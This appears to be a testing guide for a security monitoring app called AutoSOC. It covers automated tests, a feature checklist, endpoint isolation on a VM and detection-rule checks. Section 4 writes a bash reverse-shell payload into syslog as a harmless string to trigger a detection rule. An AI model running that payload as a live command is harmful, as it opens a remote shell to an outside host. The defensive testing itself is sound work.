# AutoSOC — Testing Guide

How to verify the app before a demo or release: automated tests, a manual
feature checklist, and end-to-end scenarios for agents, isolation and rules.

## 1. Automated tests (fast, run first)

```bash
.venv/bin/python -m unittest discover -s tests -v
```

Expected: **all green** (145+ tests). They cover validators, password hashing,
the risk analyzer, firewall backends, brute-force detection, the database
(incidents, IOCs, agents, blocklist, rules, invites), the phishing engine,
the SIEM rule engine, the agent/collector command channel, network retry/
backoff, and RBAC/permissions.

Also sanity-check imports and a headless launch:

```bash
python -m compileall -q autosoc main.py agent
timeout 8 .venv/bin/python main.py     # should start with no errors
```

## 2. Manual feature checklist

| Area | Steps | Expected |
|---|---|---|
| Login (local) | Register an account, log in | First account becomes admin |
| Login (OS) | Log in with your machine login/password | Accepted (Windows/Linux-PAM) |
| Lockout | 5 wrong passwords | Account locked ~15 min |
| Scan | Enter `127.0.0.1`, Start Scan | Open ports + risks listed |
| Port control | Toggle a port | Firewall rule applied (needs root/admin) |
| Anti-phishing | Analyze `http://paypal.secure-login.tk/verify` | Score high, "Suspicious/Dangerous" |
| AI key | Paste a NVIDIA key → Save & Apply | "AI engine active" (admin only) |
| Telegram | Save a Chat ID → Save & Test | Test message arrives |
| SOC console | Open it | Tabs load, no lag |
| Detection rules | Detection Rules tab | ~35 rules; toggle + Add Rule work |
| RBAC | Log in as a non-admin (viewer) | Isolate/keys/rules are blocked |

## 3. End-to-end: agent + isolation (needs a second machine or VM)

1. SOC Console → Endpoints → **Start Collector** → **Copy Install Command**.
2. On a Linux VM you control:
   ```bash
   curl -fsSL http://<autosoc-ip>:8787/agent | sudo python3 - --server http://<autosoc-ip>:8787 --token <token>
   ```
3. Verify the endpoint shows **online**; **Details** shows processes, IPs,
   listeners and connections.
4. Click **Isolate** → confirm. On the VM, `ping 8.8.8.8` should now fail, but
   the console still updates it. Badge shows 🔒 ISOLATED.
5. Click **Release** → connectivity returns.

> Only test isolation on a disposable VM — it drops all traffic except to the
> AutoSOC server.

## 4. End-to-end: detection rule fires

- **Via agent logs:** on an enrolled endpoint run a benign line that matches a
  rule, e.g. `logger 'bash -i >& /dev/tcp/10.0.0.9/4444 0>&1'` (writes to
  syslog). Within a poll cycle a `reverse_shell` event appears in Triage and an
  incident opens.
- **Via syslog:** Start Syslog, then `logger -n <autosoc-ip> -P 5514 'sshd:
  Failed password for root from 45.66.77.88'` a few times → `syslog_bruteforce`
  event.
- **Via IOC correlation:** add an IOC/blocklist IP that an endpoint is talking
  to → `conn_to_bad_ip` fires and auto-blocks.

## 5. Packaging smoke test

```bash
./packaging/build_deb.sh 3.0.0
dpkg-deb -I dist/autosoc_3.0.0_amd64.deb      # metadata OK
dpkg-deb -c dist/autosoc_3.0.0_amd64.deb      # /opt/autosoc/AutoSOC, launcher, .desktop
# On a test machine: sudo apt install ./dist/autosoc_3.0.0_amd64.deb ; autosoc
```

Windows `.exe`: build via `scripts\build_windows.bat` (or CI) and run the
installer on a Windows test box; confirm the app starts and requests admin.

## 6. Release gate (do all before tagging a version)

- [ ] Automated tests green on Linux **and** Windows (CI does both).
- [ ] Headless launch clean on both platforms.
- [ ] Manual checklist (section 2) passes.
- [ ] Agent onboard + isolate + release verified on a VM.
- [ ] `.deb` installs and launches; `.exe` installer runs.
- [ ] No secrets in logs; `.env` not committed.
